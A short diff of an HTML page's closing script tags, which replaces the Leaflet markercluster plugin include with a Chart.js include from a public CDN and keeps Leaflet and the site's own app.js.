     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="https://unpkg.com/leaflet.markercluster@1.5.3/dist/leaflet.markercluster.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <script src="js/app.js"></script>
 </body>
 </html>
